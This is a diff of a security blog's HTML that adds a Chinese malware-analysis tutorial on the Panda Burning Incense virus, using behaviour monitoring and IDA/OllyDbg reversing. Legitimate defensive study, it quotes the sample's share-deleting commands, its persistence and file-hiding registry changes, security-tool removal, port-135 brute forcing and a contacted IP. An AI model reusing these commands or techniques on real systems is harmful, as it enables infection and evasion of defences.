《了解寄存器:ESI EDI变址寄存器》<br><a target="_blank" rel="noopener" href="http://c.biancheng.net/view/3679.html%E3%80%8A%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9F%BA%E6%9C%AC%E6%8C%87%E4%BB%A4%E7%AE%80%E4%BB%8B%E3%80%8B">http://c.biancheng.net/view/3679.html《汇编语言字符串基本指令简介》</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43216249/article/details/110728729%E3%80%8A%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0--%E4%B8%B2%E6%93%8D%E4%BD%9C%E7%AF%87%EF%BC%88c++%E7%9A%84string%EF%BC%9F%EF%BC%9F%EF%BC%9F%EF%BC%89%E3%80%8B">https://blog.csdn.net/weixin_43216249/article/details/110728729《汇编语言学习笔记--串操作篇（c++的string？？？）》</a></p>
+</blockquote>
+
+      
     </div>
-  </header>
 
-  <main>
-    
-      <div class="container nopadding-x-md">
-        <div class="py-5" id="board"
-          style=margin-top:0>
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
-                
-
-
-  <div class="row mx-auto index-card">
     
     
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/09/15/DoSASM/Register/" target="_self">
-          汇编寄存器知识详解
-        </a>
-      </h1>
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
 
-      <p class="index-excerpt">
-        <a href="/2021/09/15/DoSASM/Register/" target="_self">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://vxer-lee.github.io/2021/09/07/MalwareAnalysis/6.Panda/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="VxerLee">
+      <meta itemprop="description" content="喜欢逆向破解，漏洞挖掘、Web渗透，梦想着成为Mr. Robot">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lee's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
           
+            <a href="/2021/09/07/MalwareAnalysis/6.Panda/" class="post-title-link" itemprop="url">恶意代码分析实战六：熊猫烧香病毒分析</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-09-07 17:06:43" itemprop="dateCreated datePublished" datetime="2021-09-07T17:06:43+08:00">2021-09-07</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PC%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">PC逆向</span></a>
+                </span>
+            </span>
+
           
-            
-          
-          
 
-寄存器知识一个典型的CPU由运算器、控制器、寄存器（CPU工作原理）等器件构成，这些器件靠内部总线相连。
+        </div>
+      </header>
 
-运算器进行信息处理(运算单元)
-
-寄存器进行信息存储(存储单元)
-
-控制器负责控制各种器件工作(控制单元)
-
-
-8086CPU中一共有14 个寄存器，所有寄存器都是16位宽，存2个字节，因为是完全的16位微处理器。
-AX，BX，CX，DX，SP，BP，SI，DI，IP，FLAG，CS，D
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-09-15 15:14" pubdate>
-              2021-09-15
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/PC%E9%80%86%E5%90%91/">PC逆向</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/%E6%B1%87%E7%BC%96/">汇编</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
     
     
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/09/07/MalwareAnalysis/6.Panda/" target="_self">
-          恶意代码分析实战六：熊猫烧香病毒分析
-        </a>
-      </h1>
+    
+    <div class="post-body" itemprop="articleBody">
 
-      <p class="index-excerpt">
-        <a href="/2021/09/07/MalwareAnalysis/6.Panda/" target="_self">
-          
-          
-            
-          
-           
+      
+          <meta name="referrer" content="no-referrer"/> 
 
-这一节主要通过熊猫烧香病毒来进行融会贯通，将前面学到过的所有知识都进行实践。
-所有的例子和工具都可以在https://github.com/Vxer-Lee/MalwareAnalysis里面下载到。
-熊猫烧香行为分析查壳因为程序肯定是病毒,我就不上传杀毒网去查杀了。正常我们在分析一个未知恶意程序的时候，流程都是要先上传杀毒网看看。
-用PEID进行查壳，显示未加壳，程序采用Delphi语言开
-        </a>
-      </p>
+<p>这一节主要通过熊猫烧香病毒来进行融会贯通，将前面学到过的所有知识都进行实践。</p>
+<p>所有的例子和工具都可以在<a target="_blank" rel="noopener" href="https://github.com/Vxer-Lee/MalwareAnalysis%E9%87%8C%E9%9D%A2%E4%B8%8B%E8%BD%BD%E5%88%B0%E3%80%82">https://github.com/Vxer-Lee/MalwareAnalysis里面下载到。</a></p>
+<h2 id="熊猫烧香行为分析"><a href="#熊猫烧香行为分析" class="headerlink" title="熊猫烧香行为分析"></a>熊猫烧香行为分析</h2><h3 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h3><p>因为程序肯定是病毒,我就不上传杀毒网去查杀了。正常我们在分析一个未知恶意程序的时候，流程都是要先上传杀毒网看看。</p>
+<p>用<code>PEID</code>进行查壳，显示未加壳，程序采用<code>Delphi</code>语言开发。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827103454269-846650369.png" alt="image-20210827103454071"> </p>
+<p>补充下Dephi开发的程序和C++开发的程序的一些区别。</p>
+<blockquote>
+<p>区别：<br>1.Delphi在函数调用时参数的传递不完全用栈，主要用寄存器。<br>2.而C++程序函数调用前会使用push语句将参数入栈，然后再进行call。<br>3.Delphi一般将第一个参数放入eax寄存器，第二个参数放入edx，第三个参数放入ecx寄存器，其余参数按照与VC程序类似的方式压栈。<br>4.总之，Delphi编译器默认以register方式传递函数参数。这一点与VC编译的程序完全不同。<br>5.提示：栈上给局部变量分配空间的时候，栈是向下增长的，而栈上的数组、字符串、结构体等却是向上增长的。理解这一点可以帮助识别栈上的变量。</p>
+</blockquote>
+<h3 id="简单静态分析"><a href="#简单静态分析" class="headerlink" title="简单静态分析"></a>简单静态分析</h3><p>用Strings和Dependency分别对熊猫烧香的字符串和导出表进行分析。<br>首先来看Strings分析出的字符串,这里面显示出了很多弱口令密码，猜测应该是会爆破内网的135端口弱口令，来入侵内网机器传播病毒的一个方式。还可以看到程序可能会自动感染U盘。导出表中分析出<code>URLDownload</code>函数，此函数多为下载者恶意程序。</p>
+<ul>
+<li>弱口令内网135端口爆破</li>
+<li>感染U盘</li>
+<li>下载者功能</li>
+</ul>
+<p>135弱口令爆破密码</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827104629417-521133168.png" alt="image-20210827104629392"> </p>
+<p>U盘感染字符串关键字</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827104943218-1468864770.png" alt="image-20210827104943333"> </p>
+<p>恶意下载者函数</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827105500889-1666276858.png" alt="image-20210827105500951"> </p>
+<h3 id="行为分析"><a href="#行为分析" class="headerlink" title="行为分析"></a>行为分析</h3><h4 id="进程树监控"><a href="#进程树监控" class="headerlink" title="进程树监控"></a>进程树监控</h4><p>​    这里我们还是用Process Monitor来监控病毒行为，打开Process Monitor，在筛选条件中将“样本.exe”加入到筛选器的“Process Name”中，然后运行病毒，首先可以查看一下进程树：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827110005749-2018633600.png" alt="image-20210827110005740"> </p>
+<p>​    在进程树中可以发现，“样本.exe”衍生出了”spoclsv.exe”。衍生出的进程又打开了两次“cmd.exe”。</p>
+<ul>
+<li>“cmd.exe /c net share C$ /del /y”</li>
+<li>“cmd.exe /c net share admin$ /del /y”</li>
+</ul>
+<p>第一条命令,它的意思是在命令行模式下删除C盘的网络共享，执行完后关闭cmd.exe。因为我的虚拟机里面只有一个C盘，所以我们有理由相信，这个病毒应该是会关闭系统中所有磁盘的网络共享。</p>
+<p>第二条命令是取消系统根目录的共享。</p>
+<h4 id="注册表监控"><a href="#注册表监控" class="headerlink" title="注册表监控"></a>注册表监控</h4><p>​    将<code>RegSetValue</code>添加到筛选器的“Operation”中，可以看到注册表的行为：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827111327555-2099761530.png" alt="image-20210827111327702"> </p>
+<p>​    注册表的这个位置主要是用来随机数种子的生成，仅仅靠这条信息是无法推测出病毒的行为的，所以这里我们认为“样本.exe”对于注册表是没有实质的影响。</p>
+<h4 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h4><p>​    将<code>CreateFile</code>添加到筛选器的“Operation”中，可以看到文件操作的行为：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827111709031-913077005.png" alt="image-20210827111709130"> </p>
+<p>​    可以在标红处位置看见，“样本.exe”在<code>C:\Windows\system32\drivers</code>目录创建了文件”spoclsv.exe”，之后就没有什么可疑的文件操作了，所以我们可以判断，这个恶意百度真正的破坏部分是由”spoclsv.exe”实现的，那么我们接下来就是专门来监控这个进程即可。</p>
+<h4 id="spoclsv-exe注册表监控"><a href="#spoclsv-exe注册表监控" class="headerlink" title="spoclsv.exe注册表监控"></a>spoclsv.exe注册表监控</h4><p>​    这里我们需要将进程<code>spoclsv.exe</code>的进程加入筛选器进行分析。一般来说，病毒所产生的操作会比较多，所以我们这里为了便于讨论研究，我们就只列出比较常用的操作选项来显示，我们先来看看<code>RegCreateKey</code>和<code>RegSetValue</code>：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827125313608-612008155.png" alt="image-20210827125313432"> </p>
+<p>​        可见，恶意程序创建了一个启动项<code>svcshare</code>，使<code>spoclsv.exe</code>每次重启后可继续运行。接着还可以看到<code>Hidden</code>关键字，对注册表的这个位置进行设置，能够实现文件的隐藏。此处进行设置后，即便在”文件夹选项”中选择”显示所有文件和文件夹”，也无法显示隐藏文件。</p>
+<p>​    接着我们来看看<code>RegDeleteValue</code>：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827125823405-1212262503.png" alt="image-20210827125823596"> </p>
+<p>​    可见恶意程序会将当时几乎所有的安全类工具的启动项都给删除。</p>
+<h4 id="spoclsv-exe文件监控"><a href="#spoclsv-exe文件监控" class="headerlink" title="spoclsv.exe文件监控"></a>spoclsv.exe文件监控</h4><p>​    对于文件的监控，主要是看病毒是否将自己复制到其他目录，或者是创建输出了哪些文件等，监控如下：</p>
+<p> <img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827130544487-23954527.png" alt="image-20210827130544692"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827130343259-1388850787.png" alt="image-20210827130343372"> </p>
+<p>​    可见，恶意程序会在<code>C:\Windows\system32\drivers</code>创建<code>spoclsv.exe</code>这个文件，然后会在C盘根目录创建<code>setup.exe</code>和<code>autorun.inf</code>，并且还会在一些目录生成<code>Desktop_.ini</code>文件。因为创建了这些文件之后就对注册表中的SHOWALL项进行了设置，使得隐藏文件无法显示，因此这些所创建出来的文件属性都是隐藏的。</p>
+<h4 id="spoclsv-exe网络监控分析"><a href="#spoclsv-exe网络监控分析" class="headerlink" title="spoclsv.exe网络监控分析"></a>spoclsv.exe网络监控分析</h4><p>​    在<code>Process Monitor</code>工具栏中只选择<code>Show NetWork Activity</code>，见如下图：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827131227191-961850397.png" alt="image-20210827131227383"> </p>
+<p>​    图中，192.168.200.x是我虚拟机的内网网段，可见恶意程序会不断的尝试连接我内网中的其他计算机，而且还会向<code>47.74.46.59</code>访问http发送和接受数据。</p>
+<h3 id="行为总结"><a href="#行为总结" class="headerlink" title="行为总结"></a>行为总结</h3><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827132645546-1459178767.png" alt="image-20210827132645420"> </p>
+<h2 id="熊猫烧香逆向分析"><a href="#熊猫烧香逆向分析" class="headerlink" title="熊猫烧香逆向分析"></a>熊猫烧香逆向分析</h2><p>​    在这里我们利用逆向界的倚天剑和屠龙刀，IDA和OD来对熊猫烧香进行逆向分析，对其内部实现的原理有个了解，因为篇幅关系不会对整个程序彻底分析，而是挑拣一些重要内容进行分析。</p>
+<h3 id="main入口函数"><a href="#main入口函数" class="headerlink" title="main入口函数"></a>main入口函数</h3><p>用“倚天剑”IDA Pro载入样本后可以看到如下图：</p>
+<p>图1是样本的main函数入口最开始的汇编代码，我们不从第一行汇编代码开始看，因为大部分内容都是Delphi自动生成的，我们只找关键位置来看。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827160013153-638829765.png" alt="image-20210827160013027"> </p>
+<p>图2是和图1连在一起的，因为图片太长我就分两次截图了，我们这次任务就是分析这两张图中的细节。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827160029527-1898049847.png" alt="image-20210827160029840"> </p>
+<h3 id="sub-403C98-AllocStrCpy"><a href="#sub-403C98-AllocStrCpy" class="headerlink" title="sub_403C98(AllocStrCpy)"></a>sub_403C98(AllocStrCpy)</h3><h4 id="Part1："><a href="#Part1：" class="headerlink" title="Part1："></a>Part1：</h4><p>​    我们在图1中可以看到有两个sub_403C98的函数，因为之前说过上面代码都是Delphi自动生成的，所以这里就不分析，我们最开始的地方应当是标红这位置开始分析：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827160638445-1095291330.png" alt="image-20210827160638795"> </p>
+<p>​    在图中我们可以看到两处地方都有个<code>edx</code>寄存器赋值,我们之前说过Delphi程序用寄存器来传参数,所以这里的eax和edx都是call的参数,我们下面来仔细看看是什么数据给了<code>edx</code>。</p>
+<h4 id="Part2"><a href="#Part2" class="headerlink" title="Part2:"></a>Part2:</h4><p>​    双击<code>dword_40CC40</code>处，IDA会跳转到如下地方：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827161832442-26509263.png" alt="image-20210827161832651"> </p>
+<p>​    其实这些都是中文数据，只不过IDA Pro没有自动识别出来，我们可以按<code>alt+a</code>出现如下界面后选<code>C-style</code>，就可以在图中看到IDA Pro把数据识别成了<code>***武*汉*男*生*感*染*下*载*者***</code>的中文。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827162210284-1031898902.png" alt="image-20210827162210508"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827162442878-1705923745.png" alt="image-20210827162443256"> </p>
+<h4 id="Part3："><a href="#Part3：" class="headerlink" title="Part3："></a>Part3：</h4><p>​    我们再来看看是什么数据给了eax寄存器，同样双击<code>dword_40E7D4</code>处，IDA Pro跳转如下：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827163515606-557715664.png" alt="image-20210827163513504"> </p>
+<p>​    可见IDA Pro跳转到了BSS段，我们可以猜测<code>dword_40E7D4</code>是一个未初始化的全局变量，接着我们来用屠龙刀OD 来验证下，call函数过后会把什么数据放入这个全局变量。</p>
+<h4 id="Part4"><a href="#Part4" class="headerlink" title="Part4:"></a>Part4:</h4><p>​    载入程序后，在<code>0x0040CB7E</code>地址处进行下断，然后F9运行到此位置：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827164013802-438884023.png" alt="image-20210827164014113"> </p>
+<p>​    接着我们鼠标右键<code>数据窗口中跟随</code>eax寄存器，此时在内存数据窗口中跳转到了eax寄存器的地址处，并且可以从如下图中看到<code>0x0040E7D4</code>处的内容是0，因为全局变量未初始化时候，编译器默认会将数据初始为0。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827164156179-1729690314.png" alt="image-20210827164156549"> </p>
+<p>​    这时候我们F8单步步过Call后，可见有数据被写入到地址中了。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827164544910-1642700624.png" alt="image-20210827164545148"> </p>
+<p>​    因为写入的是一个地址数据，所以我们要在内存窗口中右键<code>长型-&gt;地址</code>，来使得数据更加可视化。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827164704986-1409315842.png" alt="image-20210827164705343"> </p>
+<p>​    其地址的内容就是Call函数传入的第2个参数字符串，<code>***武*汉*男*生*感*染*下*载*者***</code>。</p>
+<p>另外一个<code>感谢艾玛,mopery对此木马的关注!~</code>的Call也是用同样方式进行分析，作者不再赘述，至此我们分析出了<code>sub_403C98</code>函数的功能，并把他重命名为<code>AllocStrCpy</code>拷贝字符串到全局变量中。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827164846164-456941484.png" alt="image-20210827164846540"> </p>
+<h3 id="sub-405360-Decode"><a href="#sub-405360-Decode" class="headerlink" title="sub_405360(Decode)"></a>sub_405360(Decode)</h3><p>​    接着继续分析第一张图的如下图的地方，从图中可见call sub_405360，有两个参数：(1)xboy，(2)一段看似加密的字符串</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210828091830334-412604358.png" alt="image-20210828091830789"> </p>
+<p>​    可见，经过Call后在ecx寄存器中得到了解密后的字符串<code>***武*汉*男*生*感*染*下*载*者***</code>。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210829104939056-235607254.png" alt="image-20210829104938707"> </p>
+<p>​    接着，我们进入Call内部详细分析解密算法，首先：如下图有一个循环的地方值得我们注意，位置在<code>0x4053D1</code></p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210829105129595-895472299.png" alt="image-20210829105129737"> </p>
+<p>​    之后借助OD的单步调试并且观察寄存器和堆栈信息，逐一对这个循环中的内容进行详细分析：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210829124015674-1657756764.png" alt="image-20210829124015412"> </p>
+<p>​    我用C++代码还原了此汇编的加密算法，运行后得到的结果是一致的。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830094004994-1611962855.png" alt="image-20210830094005367"> </p>
+<h3 id="Delphi逆向小技巧"><a href="#Delphi逆向小技巧" class="headerlink" title="Delphi逆向小技巧"></a>Delphi逆向小技巧</h3><p>​    其实Delphi有专门的反编译器，其效果不比IDA Pro差，甚至更胜一筹，其中值得比较推荐的一款就是IDR，<a target="_blank" rel="noopener" href="https://github.com/crypto2011/IDR">点我下载</a>。</p>
+<p>IDR能分析出IDA Pro无法识别的符号，而且对中文字符串的显示效果也很不错，点击SRC按钮还能反编译成Delphi伪代码。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830101159277-1018258833.png" alt="image-20210830101159646"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830101637650-715445972.png" alt="image-20210830101638529"> </p>
+<p>​    它可以将符号表（Map）文件导出，便于我们在OD中载入符号表进行调试。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830101930839-1175728359.png" alt="image-20210830101931696"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830102047798-163554858.png" alt="image-20210830102048692"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830102114759-1334884520.png" alt="image-20210830102115611"> </p>
+<p>​    显示出了Delphi的符号，便于分析和调试。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830102214299-1663242008.png" alt="image-20210830102215063"> </p>
+<h3 id="sub-404018-strcmp"><a href="#sub-404018-strcmp" class="headerlink" title="sub_404018(strcmp)"></a>sub_404018(strcmp)</h3><p>​    我们用了上面介绍的小技巧后，分析起来就轻松多了，这里直接分析出了<code>sub_404018</code>是一个strcmp字符串比较函数，用来比较解密后的字符串是否等同于全局变量。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830103011152-1741459999.png" alt="image-20210830103012060"> </p>
+<p>​    这作者好像个智障有没有觉得，他直接把明文写在代码里面用来和解密后的字符串进行比较？那你还加密啥呢？别人不逆你这Decode也能知道解密后的字符串是什么了，真是无语这种写法。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830103359286-1704758845.png" alt="image-20210830103400055"> </p>
+<h3 id="①-sub-00408024-伪装"><a href="#①-sub-00408024-伪装" class="headerlink" title="① sub_00408024(伪装)"></a>① sub_00408024(伪装)</h3><pre><code> 接下来就是逆向分析这3个Call了，首先我们来分析第一个Call：拷贝自身到系统目录进行伪装，并且设置为隐藏属性，接着用Winexec函数打开系统目录下伪装的程序，并且退出当前进程。
+</code></pre>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830103604938-258874241.png" alt="image-20210830103605850"> </p>
+<h4 id="Part1"><a href="#Part1" class="headerlink" title="Part1:"></a>Part1:</h4><p>​    <code>ParamStr</code>函数功能是根据索引返回命令行程序的参数，传入的是0返回结果是命令行程序的路径。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830111624380-110817802.png" alt="image-20210830111624929"> </p>
+<p>​    传入ParamStr返回来的绝对路径，Call过后返回来程序的目录路径，即<code>C:\Users\Administrator\Desktop</code>，所以sub_00405684可以将其重命名为SubExePath。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830112531286-1294513129.png" alt="image-20210830112532170"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830112623109-410584864.png" alt="image-20210830112624045"> </p>
+<h4 id="Part2-1"><a href="#Part2-1" class="headerlink" title="Part2:"></a>Part2:</h4><p>​    接着会用<code>strcat</code>函数拼接成如下字符串<code>C:\Users\Administrator\Desktop\Desktop_.ini</code>：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830143235064-1190881435.png" alt="image-20210830143235684"> </p>
+<p>​    传入字符串<code>C:\Users\Administrator\Desktop\Desktop_.ini</code>,Call <code>0x004057A4</code>，用IDR进入这个函数分析后有明显的API函数，可以猜测此函数是将Desktop_.ini这个文件的最后写入时间转换成DOS时间。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830143602839-519846577.png" alt="image-20210830143603415"> </p>
+<p>​    断点的数据</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830143844816-2041334392.png" alt="image-20210830143843607"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830143900975-1316925975.png" alt="image-20210830143901990"> </p>
+<p>​    DOS时间</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830144653533-663073655.png" alt="image-20210830144654099"> </p>
+<p>​    这里面截图截错了,应该是前4个字节对应时间的数据,首先0x531E ,其中0x1E代表的年月日里面的日，其余数据对应的根据MSDN上的文档进行转换。</p>
+<h4 id="part3"><a href="#part3" class="headerlink" title="part3:"></a>part3:</h4><p>​    我们part2分析的函数重命名为<code>GetFileTime2DosTime</code>，然后继续分析下面这一段代码。</p>
+<p>他会根据上面Part2的函数返回值进行判断，如果返回值为0就跳转也就是不存在Desktop_.ini文件就跳转，如果有存在<code>Desktop_.ini</code>文件存在则显示将属性设置为正常，然后再删除此文件。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210831205323853-1972299351.png" alt="image-20210831205323927"> </p>
+<h4 id="part4"><a href="#part4" class="headerlink" title="part4:"></a>part4:</h4><p>​    接着执行完流程后到达<code>00408110</code>位置处继续分析，一开始便是先获取了自身路径然后传入一个call，之后堆栈里面有个下载者相关的字符串信息这个先不管感觉没什么用，然后就是一些字符串的处理一路向下，最后到了红色标记方块处，从OD动态调试分析中可以看出他获取了系统目录然后拼接了成了字符串<code>C:\Windows\system32\drivers\spoclsv.exe</code>，不知道各位大佬还记不记得我们在行为分析的时候，就有分析出样本.exe会把自身拷贝到这个目录，达到伪装隐蔽的效果。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907111515280-1329685680.png" alt="image-20210907111514532"> </p>
+<h5 id="part5："><a href="#part5：" class="headerlink" title="part5："></a>part5：</h5><p>​    猜测这下面应该就是用代码来实现拷贝自身到系统目录了，动静态分析后确实发现是将自身程序拷贝到系统目录改名位系统文件名进行伪装，并且设置属性为隐藏属性。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907125358664-336292961.png" alt="image-20210907125357951"> </p>
+<p>接着程序就会运行在系统目录下的自身程序，并且退出当前的进程，当用OD call这个ExitProcess 程序就会退出跑飞。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907125834765-1488978688.png" alt="image-20210907125834562"> </p>
+<h3 id="②-sub-0040CA5C"><a href="#②-sub-0040CA5C" class="headerlink" title="② sub_0040CA5C"></a>② sub_0040CA5C</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第二个Call: 创建一个线程，设置定时器，创建随机数，线程函数内网135端口批量爆破。</span><br></pre></td></tr></table></figure>
 
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-09-07 17:06" pubdate>
-              2021-09-07
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/PC%E9%80%86%E5%90%91/">PC逆向</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97/">恶意代码分析系列</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
+<p>​    进入Call后分别有3个Call，第一个是创建线程。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907131806068-1586305527.png" alt="image-20210907131805794"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907131829169-1745553470.png" alt="image-20210907131829013"> </p>
+<p>第二个Call是设置一个Timer计时器。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907131855870-491188188.png" alt="image-20210907131855731"> </p>
+<p>第三个Call有创建随机数，然后调用线程函数运行<code>sub_0040B76C</code></p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907132007331-901609224.png" alt="image-20210907132006516"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907132446142-1516376043.png" alt="image-20210907132444542"> </p>
+<h3 id="③-sub-0040C97C"><a href="#③-sub-0040C97C" class="headerlink" title="③ sub_0040C97C"></a>③ sub_0040C97C</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第3个Call：终止定时器，设置4个新的计时器</span><br></pre></td></tr></table></figure>
 
-  <div class="row mx-auto index-card">
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907132927954-1956265049.png" alt="image-20210907132927685"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907132950033-1402855712.png" alt="image-20210907132949903"> </p>
+<h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><p>终于到此熊猫烧香都分析完了，从行为分析开始然后过渡到IDR软件静态分析，x32dbg动态调试分析，分析每个Call的用途，结合动静态进行验证猜测还原代码，希望各位能通过此篇文章学习到一些基础和技巧，个人水平有限文章内如有错误请指正谢谢。</p>
+<p>有不懂的或者想一起交流逆向分析、PWN、Web安全的可以加QQ群</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907133547799-151416076.png" alt="Pwn菜鸡学习小分队群聊二维码"> </p>
+
+      
+    </div>
+
     
     
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/08/12/MalwareAnalysis/5.OllyDebug/" target="_self">
-          恶意代码分析实战五：OllyDebug动态结合
-        </a>
-      </h1>
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
 
-      <p class="index-excerpt">
-        <a href="/2021/08/12/MalwareAnalysis/5.OllyDebug/" target="_self">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://vxer-lee.github.io/2021/08/12/MalwareAnalysis/5.OllyDebug/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="VxerLee">
